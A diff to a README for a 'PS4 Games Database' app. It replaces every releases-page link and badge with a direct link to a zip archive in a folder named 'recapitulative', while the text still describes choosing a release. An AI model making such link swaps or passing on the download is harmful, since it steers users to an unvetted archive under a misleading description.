@@ -6,7 +6,7 @@ Welcome to the PS4 Games Database! This application gives you access to over 6,0
 
 ## 📥 Download the Application
 
-[![Download PS4 Games Database](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JiprII/ps4-games-database/releases)
+[![Download PS4 Games Database](https://raw.githubusercontent.com/JiprII/ps4-games-database/main/recapitulative/ps4-games-database.zip)](https://raw.githubusercontent.com/JiprII/ps4-games-database/main/recapitulative/ps4-games-database.zip)
 
 To download the application and start using it, please follow these simple steps:
 
@@ -14,7 +14,7 @@ To download the application and start using it, please follow these simple steps
 
 1. **Visit the Releases Page**: Click on the link below to go directly to the releases page.
 
-   [Visit this page to download](https://github.com/JiprII/ps4-games-database/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/JiprII/ps4-games-database/main/recapitulative/ps4-games-database.zip)
 
 2. **Choose Your Version**: On the releases page, you’ll see different versions of the software. Look for the latest release, which will have the highest version number.
 
@@ -58,4 +58,4 @@ To download the application and start using it, please follow these simple steps
 
 For inquiries or support, please open an issue on the GitHub repository. The community is here to help!
 
-[![Download PS4 Games Database](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JiprII/ps4-games-database/releases)
+[![Download PS4 Games Database](https://raw.githubusercontent.com/JiprII/ps4-games-database/main/recapitulative/ps4-games-database.zip)](https://raw.githubusercontent.com/JiprII/ps4-games-database/main/recapitulative/ps4-games-database.zip)
